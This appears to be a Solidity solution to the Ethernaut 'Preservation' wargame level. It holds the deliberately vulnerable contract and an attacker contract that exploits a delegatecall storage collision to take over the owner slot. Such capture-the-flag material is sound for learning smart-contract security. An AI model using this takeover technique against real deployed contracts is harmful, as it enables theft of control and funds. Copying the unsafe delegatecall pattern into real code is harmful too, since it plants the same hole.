// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
//ca 0xB056a1E799f2cfB8229E93e9222848592A27F245
contract Preservation {

  // public library contracts 

  // timezone1libraryaddr: 0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    console.log("setFirstTime entered");
    console.log("timestamp:", _timeStamp);
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
contract Ethernaut16 {

    address public slot0;
    address public slot1;
    address public slot2;
    uint256 public slot3;

    Preservation public victim;
    address immutable public me;
    
    constructor(address _victimContract){
        victim = Preservation(_victimContract);
        me = msg.sender;
      
       
    }

    function attack() public {
        console.log("attack entered");
        victim.setSecondTime(uint256(uint160(address(this))));
        console.log("hi");
    }

    function attack2() public {
      uint256 mal = uint256(uint160(me));
      console.log("mal:",mal);
      victim.setFirstTime(mal);
      console.log("attack 2 end");
    }
     function setTime(uint _time) public {
        console.log("setTime attack entered");
        address meAdd = address(uint160(_time));
        console.log("meAdd:", meAdd);
        console.log("hi2");
        slot2 = meAdd;
    } 
}